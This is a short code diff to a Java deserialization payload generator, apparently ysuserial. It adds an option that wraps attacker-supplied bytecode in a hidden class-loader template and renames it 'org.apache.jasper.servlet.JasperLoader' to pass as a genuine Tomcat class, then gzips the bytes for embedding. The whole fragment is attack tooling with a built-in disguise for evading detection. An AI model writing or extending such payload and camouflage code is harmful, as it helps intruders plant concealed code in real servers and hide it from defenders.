@@ -135,9 +135,16 @@ public class Utils {
 		}
 	}
 
-	public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes) throws Exception {
-		CtClass ctClass = POOL.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
-		ctClass.setName(generateClassName());
+	public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes, boolean isHide) throws Exception {
+		CtClass ctClass;
+		if (isHide) {
+			ctClass = POOL.get("org.su18.ysuserial.payloads.templates.classloader.HideClassLoaderTemplate");
+			ctClass.setName("org.apache.jasper.servlet.JasperLoader");
+		} else {
+			ctClass = POOL.get("org.su18.ysuserial.payloads.templates.classloader.ClassLoaderTemplate");
+			ctClass.setName(generateClassName());
+		}
+
 		ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
 		GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
 		gzipOutputStream.write(bytes);
